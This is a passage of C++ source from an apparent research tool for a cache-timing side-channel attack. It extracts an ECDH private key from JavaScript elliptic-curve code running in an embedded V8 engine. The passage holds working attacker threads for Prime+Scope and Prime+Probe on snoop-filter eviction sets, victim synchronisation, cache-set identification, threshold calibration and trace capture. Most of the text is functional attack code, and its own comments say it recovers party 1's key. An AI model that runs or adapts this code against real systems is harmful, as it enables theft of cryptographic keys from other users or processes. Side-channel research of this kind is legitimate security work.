static int ps_thread_cl[cache_line_count];
static PP_attacker_thread_config_t pp_cfg[cache_line_count];
static uint32_t ps_run_idx[cache_line_count];

static void *v8_attacker_thread(void *arg) {
	const int cl = *(const int *)arg;
	const bool lead = (cl == 0); /* the only line that may touch sync_ctx */

	if (lead) {
		log_channels("PS");
		log_info("attacker(PS) re-prime: %s",
		         ps_fast_reprime ? "SF chain only (-ps-chain)" : "full evset");
		if (!ps_fast_reprime) {
			log_info("attacker(PS)   arr_repeat %u, l2_repeat %u",
			         (unsigned)ps_arr_repeat,
			         (unsigned)ps_l2_repeat);
		}
	}

	helper_thread_ctrl ev_hctrl;
	if (start_helper_thread(&ev_hctrl)) {
		log_error("attacker cl%d: failed to start evset helper thread", cl);
		exit(1);
	}
	for (int t = 0; t < 16 && !ps_evsets[cl]; ++t) {
		ps_evsets[cl] = prepare_evset(fr_lines[cl].target, &ev_hctrl);
	}
	if (!ps_evsets[cl]) {
		log_error("attacker cl%d: failed to build evset for %p",
		          cl,
		          (void *)fr_lines[cl].target);
		exit(1);
	}
	ps_chains[cl] = evchain_build(ps_evsets[cl]->addrs, SF_ASSOC);
	stop_helper_thread(&ev_hctrl);
	log_info("cl%d evset=%p (built on core %d)",
	         cl,
	         (void *)ps_evsets[cl],
	         get_current_cpu());

	uint8_t *scope = ps_evsets[cl]->addrs[0];
	i64 threshold = detected_cache_lats.l2_thresh;
	const int clock_cl = find_clock_cl();

	const int cp = psd_probe_total();
	for (int r = 0; r < cp + victim_runs; ++r) {
		const bool psd_probing = r < cp;

		/* Both channel threads are lockstep-synchronized every iteration by
		 * the barriers below, so r == cp (the first post-probe run) is the
		 * first point both channels' evhealth_* are GUARANTEED complete --
		 * every earlier iteration's per-channel psd_record has already run.
		 * Only the lead may read across channels; the second wait keeps the
		 * other thread from racing ahead into real capture while it does. */
		if (r == cp && psd_check_arg) {
			pthread_barrier_wait(&attacker_threads_barrier);
			if (lead && !probe_verdict()) {
				exit(1);
			}
			pthread_barrier_wait(&attacker_threads_barrier);
		}

		uint32_t idx[cache_line_count] = { 0 };
		prime_skx_sf_evset_ps_flush(
		    ps_evsets[cl], ps_chains[cl], array_repeat, l2_repeat);

		pthread_barrier_wait(&attacker_threads_barrier);
		if (lead) {
			pthread_barrier_wait(sync_ctx.barrier); /* A: release victim call */
		}
		pthread_barrier_wait(&attacker_threads_barrier);
		u64 end, t0 = rdtscp(), t1 = t0;
		u32 aux;
		uint64_t poll_iters = 0;
		uint64_t lat_over_thresh[cache_line_count] = { 0 };
		uint64_t lat_over_interrupt[cache_line_count] = { 0 };
		uint64_t lat_sum[cache_line_count] = { 0 };
		uint64_t lat_max[cache_line_count] = { 0 };
		bool full = false;
		do {
			++poll_iters;
			u64 scope_lat = _time_maccess_aux(scope, end, aux);
			lat_sum[cl] += scope_lat;
			if (scope_lat > lat_max[cl]) {
				lat_max[cl] = scope_lat;
			}
			if ((i64)scope_lat > threshold) {
				++lat_over_thresh[cl];
				if (scope_lat < (u64)detected_cache_lats.interrupt_thresh &&
				    idx[cl] < profile_iterations) {
					sample_tsc[cl][idx[cl]] = rdtscp();
					reload_time[cl][idx[cl]] = scope_lat;
					++idx[cl];
					if (idx[cl] == profile_iterations) {
						full = true;
					}
				} else {
					++lat_over_interrupt[cl];
				}
				if (ps_fast_reprime) {
					prime_evchain_prime_scope(ps_chains[cl]);
				} else {
					prime_skx_sf_evset_ps_flush(ps_evsets[cl],
					                            ps_chains[cl],
					                            ps_arr_repeat,
					                            ps_l2_repeat);
				}
			}
			t1 = rdtscp();
		} while (!full && sync_ctx_get_action() == SYNC_CTX_START &&
		         (t1 - t0) < max_exec_cycles);

		ps_run_idx[cl] = idx[cl];
		/* Before the barrier: past it the lead may clear every channel's
		 * buffer, and this reads its own. */
		if (psd_probing) {
			psd_record(cl, r, idx[cl]);
		}
		pthread_barrier_wait(&attacker_threads_barrier);

		if (lead) {
			pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous, victim */

			char counts[256];
			const char *label = psd_probing ? "psd-check probe" : "run";
			log_info("%s %d/%d: evictions %s",
			         label,
			         r < cp ? r + 1 : r - cp + 1,
			         r < cp ? cp : victim_runs,
			         format_counts(counts, sizeof(counts), ps_run_idx));
			if (r >= cp) {
				dump_profiling_traces(test_name,
				                      victim_runs,
				                      sample_tsc,
				                      probe_time,
				                      cache_line_count,
				                      profile_iterations,
				                      r == cp);
				check_clock_hits(ps_run_idx[clock_cl], r - cp + 1);
			}
			clear_samples(ps_run_idx);
		}
		/* Nobody re-primes for the next run until the dump has been taken. */
		pthread_barrier_wait(&attacker_threads_barrier);
	}
	if (lead) {
		report_clock_hit_violations();
	}
	return nullptr;
}

/* PRIME+PROBE, after experiments/quickjs_jpeg/quickjs_jpeg.c: the evset and
 * its eviction threshold come from prepare_evset_thres (in main, as there),
 * the config is a PP_attacker_thread_config_t, and each run is one call to
 * PP_profile_once (src/attack/prime_probe.c) -- same flush/prime with
 * array_repeat and l2_repeat from src/attack/LLCF.c, same
 * probe_skx_sf_evset_para, same spurious-sample rule, same re-prime on
 * detection, so this thread does not hand-roll any of that itself.
 *
 * One poll times a traversal of the whole set, so it measures and restores in
 * the same pass; there is no post-detection blind window as in P+S.
 *
 * It is a local loop rather than a call to PP_attacker_thread for two reasons,
 * both because this victim is IN-PROCESS and profiled victim_runs times:
 *
 *   - PP_profile_once has no sync_ctx-based early exit -- it always polls
 *     for its whole max_exec_cycles unless profile_iterations fills first
 *     -- so it is called here with pp_max_exec_cycles (~100M cycles, see
 *     its own comment), not this file's generic max_exec_cycles (5e10,
 *     ~17s -- sized for the F+R/P+S loops' early-exit case, see there).
 *   - The two attacker threads must rendezvous every run: sync_ctx's barrier
 *     has exactly 2 slots so only cl0 may touch it (PP_profile_once's own
 *     slot==0 check), and nobody may re-prime for run r+1 until run r has
 *     been dumped -- attacker_threads_barrier below still enforces that,
 *     same as before.
 *
 * -csi and -psd-check both moved to setup (identify_ctjs_target_sets,
 * pp_evset_quality_ok in v8_ctjs_ecdh_attack) -- by the time this thread
 * runs, cfg->evset is already picked and vetted, so this is a plain capture
 * loop, no probe phase.
 */
static void *v8_attacker_thread_pp(void *arg) {
	PP_attacker_thread_config_t *cfg = (PP_attacker_thread_config_t *)arg;
	const int cl = cfg->slot;
	const bool lead = (cl == 0);
	EVSet *const evset = cfg->evset;
	const int threshold = cfg->threshold;
	const int clock_cl = find_clock_cl();

	if (lead) {
		log_channels("PP");
	}
	log_info("Parallel Prime+Probe %s threshold: %d", cfg->label, threshold);

	for (int r = 0; r < victim_runs; ++r) {
		PP_profile_once(evset,
		                cl,
		                cfg->label,
		                threshold,
		                profile_iterations,
		                pp_max_exec_cycles,
		                sample_tsc,
		                probe_time);

		uint32_t index = 0;
		for (int i = 0; i < profile_iterations; ++i) {
			if (sample_tsc[cl][i] != 0) {
				++index;
			}
		}
		ps_run_idx[cl] = index;
		pthread_barrier_wait(&attacker_threads_barrier);

		if (lead) {
			char counts[256];
			log_info("run %d/%d: evictions %s",
			         r + 1,
			         victim_runs,
			         format_counts(counts, sizeof(counts), ps_run_idx));
			dump_profiling_traces(test_name,
			                      victim_runs,
			                      sample_tsc,
			                      probe_time,
			                      cache_line_count,
			                      profile_iterations,
			                      r == 0);
			check_clock_hits(ps_run_idx[clock_cl], r + 1);
			/* PP_profile_once does not clear between runs -- it does not have
			 * to, its victim runs once. Here run r+1 would otherwise dump
			 * run r's tail wherever it detected less. */
			clear_samples(ps_run_idx);
		}
		/* Nobody re-primes (PP_profile_once's next call) until the dump has
		 * been taken. */
		pthread_barrier_wait(&attacker_threads_barrier);
	}
	if (lead) {
		report_clock_hit_violations();
	}
	return nullptr;
}

enum { victim_bits_max = 1 << 8 };
static int64_t vb_ts[victim_bits_max];
static uint8_t vb_bit[victim_bits_max];
static char vb_out[victim_bits_max * 24];

/* gt_n, NOT gt_len: gt_len is the fixed capacity of the two arrays, while gt_n
 * is how many slots the last ladder filled. It has to go through a script --
 * these are `let`/`const` bindings in the bundle's script scope, not properties
 * of globalThis, so they cannot be read off the global object. */
static const char victim_ground_truth[] =
    "(() => { return [gt_ts, gt_bit, gt_n]; })()";

static void grab_victim_ground_truth(v8::Isolate *isolate,
                                     v8::Local<v8::Context> context,
                                     v8::Local<v8::Script> grab_script) {
	v8::HandleScope handle_scope(isolate);
	v8::Local<v8::Value> got;
	if (!grab_script->Run(context).ToLocal(&got) || !got->IsArray()) {
		return;
	}
	v8::Local<v8::Object> triple = got.As<v8::Object>();
	v8::Local<v8::Value> ts_v, bit_v, len_v;
	if (!triple->Get(context, 0).ToLocal(&ts_v) ||
	    !triple->Get(context, 1).ToLocal(&bit_v) ||
	    !triple->Get(context, 2).ToLocal(&len_v)) {
		return;
	}
	if (!ts_v->IsBigInt64Array() || !bit_v->IsUint8Array()) {
		return;
	}
	uint32_t n = len_v->Uint32Value(context).FromMaybe(0);
	if (n == 0) {
		return;
	}
	if (n > victim_bits_max) {
		log_error("victim oracle: %u pairs in one run, keeping %d",
		          n,
		          victim_bits_max);
		n = victim_bits_max;
	}
	ts_v.As<v8::ArrayBufferView>()->CopyContents(vb_ts, n * sizeof(vb_ts[0]));
	bit_v.As<v8::ArrayBufferView>()->CopyContents(vb_bit,
	                                              n * sizeof(vb_bit[0]));

	size_t at = 0;
	for (uint32_t j = 0; j < n; ++j) {
		int w = snprintf(vb_out + at,
		                 sizeof(vb_out) - at,
		                 "%lld,%u\n",
		                 (long long)vb_ts[j],
		                 (unsigned)vb_bit[j]);
		if (w < 0 || (size_t)w >= sizeof(vb_out) - at) {
			break;
		}
		at += (size_t)w;
	}

	/* victim_bits.txt, NOT channels -- write_channel_metadata() owns
	 * <dir>/channels, and clobbering it would cost the decoder the col->role
	 * mapping, i.e. the whole capture rather than just the oracle. */
	char dir[256], path[512];
	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/victim_bits.txt", dir);

	/* Opened "w" on the first run and kept open, so the later runs append to
	 * the one file rather than each truncating it. */
	static FILE *fp = nullptr;
	if (fp == nullptr) {
		fp = fopen(path, "w");
	}
	if (fp == nullptr) {
		log_error("could not write ground truth to %s", path);
		return;
	}
	fwrite(vb_out, 1, at, fp);
	fflush(fp);
}

void print_helper(int argc, char *argv[]) {
	log_error(
	    "Usage: %s [options] <source.js> <repeat.js> <key_path>\n"
	    "  <key_path>           ec_key_<i>.json pool entry ({key1,key2}, "
	    "sets both parties)\n"
	    "                       or a raw-hex scalar file (sets party 1 "
	    "only)\n"
	    "  -fr                  FLUSH+RELOAD instead of the default "
	    "same-process PRIME+SCOPE\n"
	    "  -pp                  PRIME+PRIME: time a traversal of the whole "
	    "evset, which\n"
	    "                       measures and re-primes in one pass (no "
	    "post-detection\n"
	    "                       blind window, dearer per poll)\n"
	    "  -ps-repeat=<n>       P+S: evset replays per re-prime (default "
	    "%u, shared default %u)\n"
	    "  -ps-full             P+S: re-prime with the shared defaults "
	    "(~15k cyc/detection)\n"
	    "  -ps-chain            P+S: re-chase the SF chain only -- fast but "
	    "stops detecting\n"
	    "  -cl<i>=<h>:<off>[:<role>]  retarget channel i, e.g. "
	    "-cl0=and:0x0c0:0\n"
	    "                       (<h> = any substring of a handler name: "
	    "neg, and, xor)\n"
	    "  -wait=<cyc>          F+R inter-poll delay (default %lu)\n"
	    "  -thresh=<cyc>        F+R hit threshold (default %ld)\n"
	    "  -runs=<n>            profiled derive() calls (default %d)\n",
	    argv[0],
	    (unsigned)ps_arr_repeat,
	    (unsigned)array_repeat,
	    (unsigned long)fr_wait_cycles,
	    (long)fr_hit_thresh,
	    victim_runs);
	/* Split: log_error formats into a fixed 1024-byte buffer, and the whole
	 * usage text no longer fits (it used to overflow it outright). */
	log_error("  -warmup=<n>          unprofiled derive() calls first (default "
	          "%d)\n",
	          warmup_runs);
	log_error(
	    "  -csi                 -pp only: cache set identification --"
	    " instead of\n"
	    "                       prepare_evset_thres's address-based "
	    "construction, scan\n"
	    "                       every SF set near the target's page slot "
	    "(get_sf_kth_evset)\n"
	    "                       under the REAL key already loaded and pick "
	    "the one whose\n"
	    "                       own eviction signature looks like the "
	    "channel it's supposed\n"
	    "                       to be (see identify_ctjs_target_sets and "
	    "the CACHE SET\n"
	    "                       IDENTIFICATION comment). Not supported with "
	    "-fr/-ps\n"
	    "  -csi-dump            implies -csi: scan EVERY candidate instead of "
	    "stopping at\n"
	    "                       the first match, log each one and dump its "
	    "trace to\n"
	    "                       output/v8_ctjs_ecdh_csi_{clock,marker}/ -- how "
	    "the accept\n"
	    "                       bounds are (re)measured\n"
	    "  -csi-oracle          implies -csi: EVALUATION ONLY -- label each "
	    "candidate with\n"
	    "                       whether it really evicts the target line. Uses "
	    "the address\n"
	    "                       CSI may not know, so it never gates "
	    "acceptance\n"
	    "  -csi-runs=<n>        probe runs for -psd-check's segment (P+S "
	    "only, default\n"
	    "                       %d)\n",
	    csi_runs);
	log_error(
	    "  -psd-check           evset health check: rejects (aborts) a "
	    "channel whose\n"
	    "                       hit-rate/gap-spread looks self-evicting, "
	    "works on ANY key\n"
	    "                       -- a separate, independent check from -csi, "
	    "see the EVSET\n"
	    "                       HEALTH comment. ALWAYS ON for -pp "
	    "(identify_ctjs_target_\n"
	    "                       sets/pp_evset_quality_ok, setup phase, "
	    "unconditionally --\n"
	    "                       -csi's own scan already vets its evsets the "
	    "same way), opt-in\n"
	    "                       for -ps (round-loop probe segment, see "
	    "-csi-runs). Not\n"
	    "                       supported with -fr. A cheap absolute "
	    "hit-count ceiling on\n"
	    "                       the clock channel also runs on every "
	    "CAPTURED run\n"
	    "                       regardless of this flag -- see the LIVE "
	    "HIT-COUNT MONITOR\n"
	    "                       comment\n"
	    "\n"
	    "The victim's own per-bit (tsc, bit) ground truth is NOT a flag here: "
	    "it is on\n"
	    "whenever the <source.js> handed to us has `let debug = 1;`, which is "
	    "what\n"
	    "run_ecdh_ct.sh's BITS=1 generates. See evaluation/run_ecdh_ct.sh.");
}

/* Sets s1 (and s2, for a pool .json) from a key file, in the given context.
 * Used both for the initial real -key load and, mid-run, for -csi's three
 * known-key probe segments -- see v8_victim_run's round loop. Same-process,
 * same isolate: no cross-thread handoff needed, unlike v8_constant_time_js.cc
 * / v8_ecdh_key_pool.cc's cross-process csi_set_key (see the CACHE SET
 * IDENTIFICATION comment). */
static bool v8_set_key(v8::Isolate *isolate,
                       v8::Local<v8::Context> context,
                       const char *path) {
	char key_script[4096];
	char key_path_js[2048];
	js_quote(path, key_path_js, sizeof(key_path_js));
	if (has_suffix(path, ".json")) {
		snprintf(key_script,
		         sizeof(key_script),
		         "(() => { let kp = JSON.parse(read(%s)); "
		         "s1 = ec.keyFromPrivate(kp.key1, 'hex'); "
		         "s2 = ec.keyFromPrivate(kp.key2, 'hex'); "
		         "s1_pub = s1.getPublic(); s2_pub = s2.getPublic(); "
		         "return kp.key1; })()",
		         key_path_js);
	} else {
		/* Party 2 keeps whatever the bundle set: a raw-hex file names one
		 * scalar, and it is party 1's that the attack recovers. */
		snprintf(key_script,
		         sizeof(key_script),
		         "(() => { let k = read(%s).trim(); "
		         "s1 = ec.keyFromPrivate(k, 'hex'); "
		         "s1_pub = s1.getPublic(); "
		         "return k; })()",
		         key_path_js);
	}
	v8::Local<v8::String> key_src =
	    v8::String::NewFromUtf8(isolate, key_script).ToLocalChecked();
	v8::Local<v8::Script> key_compiled;
	v8::Local<v8::Value> key_result;
	bool ok = v8::Script::Compile(context, key_src).ToLocal(&key_compiled) &&
	          key_compiled->Run(context).ToLocal(&key_result) &&
	          key_result->IsString();
	if (ok) {
		v8::String::Utf8Value key_hex(isolate, key_result);
		log_info("attack key %s (hex): %s", path, *key_hex);
	} else {
		log_error("failed to set s1 from key file %s", path);
	}
	return ok;
}

/* Everything that runs with the isolate ENTERED. It has to be its own
 * scope: v8::Isolate::Scope, the HandleScope, the TryCatch and the
 * Context::Scope must all destruct before Isolate::Dispose(), which is a
 * hard V8 CHECK -- "Disposing the isolate that is entered by a thread".
 * As function-level locals of the thread entry they were still alive at
 * the Dispose() call below and every capture aborted after its last run. */
static void v8_victim_run(v8::Isolate *isolate) {
	v8::Isolate::Scope iscope(isolate);
	v8::HandleScope scope(isolate);
	v8::TryCatch try_catch(isolate);

	isolate->SetJitCodeEventHandler(
	    static_cast<v8::JitCodeEventOptions>(v8::kJitCodeEventDefault |
	                                         v8::kJitCodeEventEnumExisting),
	    jit_event_handler);
	isolate->SetJitCodeEventHandler(v8::kJitCodeEventDefault, nullptr);

	v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
	global->Set(isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
	global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
	global->Set(
	    isolate, "readbuffer", v8::FunctionTemplate::New(isolate, ReadBuffer));
	global->Set(isolate, "print", v8::FunctionTemplate::New(isolate, Print));
	v8::Local<v8::Context> context = v8::Context::New(isolate, nullptr, global);
	v8::Context::Scope cscope(context);

	log_info("V8 runtime load source (classic script)");
	/* ecdh_ct_eval.js is a classic (non-module) bundle: its top-level
		 * `var ec = ...; var s1 = ...;` etc. become globalThis properties when
		 * run as a plain script, matching v8_ecdh's existing convention. */
	v8::Local<v8::String> source =
	    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();
	v8::Local<v8::Script> source_script;
	bool source_ok =
	    v8::Script::Compile(context, source).ToLocal(&source_script) &&
	    !source_script->Run(context).IsEmpty();

	bool key_ok = source_ok && v8_set_key(isolate, context, key_path);

	v8::Local<v8::Script> repeat_script;
	v8::Local<v8::Value> repeat_result;
	bool repeat_ok = false;
	if (key_ok) {
		v8::Local<v8::String> repeat_src =
		    v8::String::NewFromUtf8(isolate, repeat_str).ToLocalChecked();
		repeat_ok =
		    v8::Script::Compile(context, repeat_src).ToLocal(&repeat_script) &&
		    repeat_script->Run(context).ToLocal(&repeat_result) &&
		    repeat_result->IsFunction();
	}
	if (!source_ok) {
		ReportException(isolate, &try_catch);
		log_error("failed to load source script");
		return;
	} else if (!key_ok) {
		return;
	} else if (!repeat_ok) {
		ReportException(isolate, &try_catch);
		log_error("repeat script must evaluate to a function");
		return;
	}
	v8::Local<v8::Function> repeat_func = repeat_result.As<v8::Function>();

	for (int h = 0; h < handler_count; ++h) {
		log_info(LOG_BOLD_ON "%-30s %p (%zu bytes)" LOG_BOLD_OFF,
		         handlers[h].name,
		         (void *)handlers[h].addr,
		         handlers[h].len);
	}

	for (int i = 0; i < warmup_runs; ++i) {
		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
	}
	log_info("warmup done (%d unprofiled derives)", warmup_runs);

	v8::Local<v8::Script> grab_script =
	    v8::Script::Compile(context,
	                        v8::String::NewFromUtf8(isolate,
	                                                victim_ground_truth)
	                            .ToLocalChecked())
	        .ToLocalChecked();

	/* Whether the victim records its per-bit ground truth is the LOADED
	 * SOURCE's decision, not ours: run_ecdh_ct.sh's BITS=1 generates a copy
	 * with `let debug = 1;` and hands us that. Read it once, here, instead of
	 * carrying an attacker flag that could disagree with the source actually
	 * running -- a flag set with debug=0 source drains nothing, and a flag
	 * forgotten with debug=1 source records pairs and throws them away, and
	 * both look like a healthy capture that quietly has no oracle.
	 *
	 * `typeof` first so an older bundle without the binding reads as off
	 * rather than throwing a ReferenceError into the enclosing TryCatch. */
	bool oracle_on = false;
	{
		v8::Local<v8::String> dbg_src = v8::String::NewFromUtf8Literal(
		    isolate, "(typeof debug !== 'undefined' && !!debug)");
		v8::Local<v8::Value> dbg_val;
		if (v8::Script::Compile(context, dbg_src)
		        .ToLocalChecked()
		        ->Run(context)
		        .ToLocal(&dbg_val)) {
			oracle_on = dbg_val->BooleanValue(isolate);
		}
	}
	if (oracle_on) {
		log_info("victim oracle ON (debug=1 in the loaded source): its own "
		         "(tsc,bit) pairs are drained after each profiled run into "
		         "output/%s_r%05d/victim_bits.txt",
		         test_name,
		         victim_runs);
	}

	/* PP's setup (v8_ctjs_ecdh_attack, before any attacker thread exists)
	 * drives its own indeterminate number of profiling derives -- CSI's
	 * scan (identify_ctjs_target_sets) and/or the psd-check quality gate
	 * (pp_evset_quality_ok) -- through PP_profile_once, which needs a
	 * partner on this side for every round. pp_setup_more (same-process
	 * atomic, not sync_ctx) tells this loop when the LAST such round has gone
	 * by -- see the CACHE SET IDENTIFICATION / pp_setup_more comments.
	 *
	 * The real key is already loaded (see v8_set_key above), and it is what
	 * the scan's first stage measures. -csi's second stage re-keys to the
	 * known probe scalars through pp_setup_key; csi_set_probe_key drives one
	 * round per change, and restores the real key before capture.
	 *
	 * BOTH flags are written by the attacker before it reaches barrier A and
	 * read here after it, because A is what orders them. Reading them after B
	 * -- which is what this loop used to do -- is a race, not a handshake:
	 * the attacker is the thread that releases B (it arrives last, having
	 * probed for the whole window while this thread sat in the barrier), so
	 * it can publish the NEXT round's flags before this thread is scheduled
	 * to read the current round's. It happened to hold while every round was
	 * followed by milliseconds of attacker-side work, and broke the moment a
	 * caller re-armed immediately (CSI stage 2), which ended the setup loop a
	 * round early and left the attacker waiting on a barrier the victim had
	 * already walked away from. */
	if (prim == PRIM_PP && (csi_arg || psd_check_arg)) {
		log_info("victim: entering PP setup-support loop");
		for (;;) {
			pthread_barrier_wait(sync_ctx.barrier); /* A */
			bool more = pp_setup_more.exchange(false, std::memory_order_acq_rel);
			const char *next_key =
			    pp_setup_key.exchange(nullptr, std::memory_order_acq_rel);
			/* Inside the window, but only ever on a round csi_set_probe_key
			 * drives, and that one records nothing. */
			if (next_key != nullptr && !v8_set_key(isolate, context, next_key)) {
				log_error("victim: failed to load CSI probe key %s", next_key);
			}
			(void)repeat_func->Call(context, context->Global(), 0, nullptr);
			sync_ctx_set_action(SYNC_CTX_PAUSE);
			pthread_barrier_wait(sync_ctx.barrier); /* B */
			if (!more) {
				break;
			}
		}
		log_info("victim: PP setup done");
	}

	/* When -psd-check is given (P+S only -- PP's moved to setup above), the
	 * attacker spends psd_probe_total() runs probing before it captures
	 * anything, and every one of those is a full rendezvous. This loop must
	 * be sized with the SAME expression -- the attacker waits on barrier A
	 * once per iteration of its own loop, so a victim that stopped at
	 * victim_runs would leave it there. They are extra derives, nothing
	 * more: the victim cannot tell a probe run from a captured one, and does
	 * not need to except for the drain below. Not reached with -fr
	 * (rejected at argument parsing), so cp is 0 there regardless. */
	const int cp = psd_probe_total();
	if (cp > 0) {
		log_info("victim: %d probe derive(s) before the %d captured",
		         cp,
		         victim_runs);
	}

	log_info("victim ready to start");

	for (int r = 0; r < cp + victim_runs; ++r) {
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
		sync_ctx_set_action(SYNC_CTX_PAUSE);

		/* Empty the nursery so the NEXT ladder does not have to. elliptic's
		 * ladder allocates in every dbl/diffAdd/redMul -- ~1.3 MB per derive
		 * -- so left alone V8 scavenges about once per ladder, INSIDE the
		 * attacker's window, and --single-threaded makes that stop-the-world
		 * on this thread: a 190-240k cycle hole, 4-5 bit slots wide.
		 *
		 * The trigger is a byte count, not a clock, so each stall lands a
		 * fixed amount of ALLOCATION after the last and walks the ladder at
		 * a constant rate -- measured +3 slots/run on P+P k0, wrapping at
		 * 245. Over hundreds of runs that averages out; over the 8-20 a
		 * decode uses it is a contiguous band of slots blinded in every
		 * trace, which is bias, not noise. Collecting here took it from 0.80
		 * to 0.01 stalls per run (evaluation/check_victim_stalls.py).
		 *
		 * Here, and not at the top of the loop, because P+P primes its evset
		 * BEFORE waiting on barrier A: a collection between A and the
		 * previous B would sweep 1.3 MB through the cache against a primed
		 * set and hand the attacker a burst of victim-free "evictions" as
		 * the window opens. After SYNC_CTX_PAUSE the window is closed, and B
		 * orders this before the attacker re-primes; the cost is at most one
		 * late probe overlapping it, past the end of the ladder.
		 *
		 * Run 0 still pays for whatever the warmup derives left behind. */
		u64 gc_t0 = rdtscp();
		isolate->RequestGarbageCollectionForTesting(
		    v8::Isolate::kFullGarbageCollection);
		if (r == cp) {
			/* Logged so a capture says in its own output whether it came
			 * from a binary with this in it. Without the line, a stale
			 * binary is indistinguishable from a fix that did not work:
			 * both show the drifting stall. */
			log_info("per-run full GC between window close and barrier B: "
			         "%lu cyc (--expose-gc)",
			         (unsigned long)(rdtscp() - gc_t0));
		}

		pthread_barrier_wait(sync_ctx.barrier); /* B */
		/* r >= cp: a csi probe derive produces no trace, so its block of
		 * (tsc,bit) pairs would put victim_bits.txt out of step with the
		 * traces it is the ground truth FOR -- the decoder matches them by
		 * position, block i to r<i>.out. */
		if (oracle_on && r >= cp) {
			grab_victim_ground_truth(isolate, context, grab_script);
		}
	}
}

void *v8_victim_thread(void *) {
	/* --expose-gc is what RequestGarbageCollectionForTesting checks for; the
	 * per-run collection in v8_victim_run is a hard ApiCheck failure without
	 * it. A default young generation can still refill during one ~1.3 MB
	 * ladder. Keep a 16 MiB semi-space so that its scavenge cannot land in the
	 * capture window (at the cost of a modestly longer bit period).
	 *
	 * This runs AFTER main's SetFlagsFromCommandLine -- the thread is created
	 * on the line below it -- so these win over anything passed on the
	 * command line. */
	v8::V8::SetFlagsFromString(
	    "--allow-natives-syntax --no-sparkplug --always-turbofan "
	    "--single-threaded --expose-gc --min-semi-space-size=16");
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);

	v8_victim_run(isolate);

	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return nullptr;
}

/* Prime+Probe eviction threshold for a scanned candidate.
 *
 * The capture loop probes with probe_skx_sf_evset_para -- one timed traversal
 * of all SF_ASSOC lines -- so its threshold is a whole-traversal latency, not
 * the single-line detected_cache_lats.l2_thresh a P+S scope access is
 * compared against. On leapx02 a traversal costs ~100 cycles clean and ~150
 * with one line evicted, against an l2_thresh of 91: handing l2_thresh to
 * PP_profile_once makes EVERY probe a detection, which is what -csi used to
 * do to the capture it set up.
 *
 * LLCFeasible's calibrate_para_probe_lat measures exactly this, but it builds
 * its "a congruent line was touched" reference by having the helper thread
 * read the TARGET -- the address cache set identification may not assume it
 * knows. Any foreign access to a congruent line back-invalidates one of our
 * ways just the same, and the evset carries one the probe never touches:
 * build_sf_evset_all keeps up to SF_ASSOC + 1 addresses while
 * prime_skx_sf_evset_para promotes, and probe_skx_sf_evset_para reads, only
 * the first SF_ASSOC. Priming therefore pushes addrs[SF_ASSOC] back out of
 * the snoop filter, and a foreign read of it stands in for the victim's line.
 *
 * Returns 0 when the two populations do not separate, which is itself a
 * verdict: an evset that cannot be told apart from its own idle state cannot
 * be probed, so the candidate is skipped. */
static int csi_calibrate_thres(EVSet *evset, helper_thread_ctrl *hctrl) {
	enum { calib_repeat = 1000 };
	static i64 no_acc_lats[calib_repeat], acc_lats[calib_repeat];

	/* build_sf_evset_all clips evsets to SF_ASSOC + 1 ways but does not
	 * guarantee the extra one, and on a sparse build a large share of a page
	 * slot comes back with exactly SF_ASSOC. Rejecting those outright -- what
	 * this did first -- silently threw away half of one slot's candidates,
	 * the true marker among them, and no amount of re-running recovered it.
	 * Without a spare congruent line there is no way to synthesise the
	 * "evicted" case, so fall back to predicting it: one line missing from
	 * the traversal costs about one L3-vs-L2 latency difference, and the
	 * threshold sits at the same 5/9 of the way across that the measured
	 * branch uses. On leapx02 that predicts 126 where the measurement gives
	 * 127. */
	const bool have_evictor = evset->size > SF_ASSOC;
	u8 *evictor = have_evictor ? evset->addrs[SF_ASSOC] : nullptr;
	u64 end_tsc;

	flush_evset(evset);
	_lfence();

	/* Only the no-access half is measurable without an evictor, so halve the
	 * work in that case rather than timing the same thing twice. */
	const u64 rounds = have_evictor ? calib_repeat * 2 : calib_repeat;
	for (u64 r = 0; r < rounds;) {
		u32 aux_before, aux_after;
		const bool acc_round = have_evictor && (r % 2);
		_rdtscp_aux(&aux_before);
		_lfence();
		prime_skx_sf_evset_para(evset, array_repeat, l2_repeat);
		_lfence();
		if (acc_round) {
			helper_thread_read_single(evictor, hctrl);
		}
		_lfence();
		i64 lat = probe_skx_sf_evset_para(evset, &end_tsc, &aux_after);
		if (aux_before == aux_after &&
		    lat < detected_cache_lats.interrupt_thresh) {
			if (acc_round) {
				acc_lats[r / 2] = lat;
			} else {
				no_acc_lats[have_evictor ? r / 2 : r] = lat;
			}
			r += 1;
		}
		_lfence();
	}

	i64 no_acc = find_median_lats(no_acc_lats, calib_repeat);
	if (have_evictor) {
		i64 acc = find_median_lats(acc_lats, calib_repeat);
		if (acc <= no_acc) {
			/* A spare congruent line that cannot displace anything means the
			 * evset does not really hold the set: reject rather than guess. */
			return 0;
		}
		/* Same weighting calibrate_probe_lat uses. */
		return (int)((5 * acc + 4 * no_acc) / 9);
	}

	/* Predicted-eviction fallback (see above): one missing line costs about
	 * one L3-vs-L2 latency difference, and the threshold sits 5/9 of the way
	 * across it -- the same weighting as the measured branch. */
	i64 span = detected_cache_lats.l3 - detected_cache_lats.l2;
	if (span <= 0) {
		return 0;
	}
	return (int)(no_acc + (5 * span) / 9);
}

/* Evaluation-only (-csi-oracle): does this candidate actually contain the
 * target line? Uses the address CSI is not allowed to look at, so it never
 * gates acceptance -- it only labels each candidate in the log, which is what
 * makes the fingerprint's hits and misses measurable instead of guessed. */
static bool csi_is_true_set(uintptr_t target, EVSet *evset) {
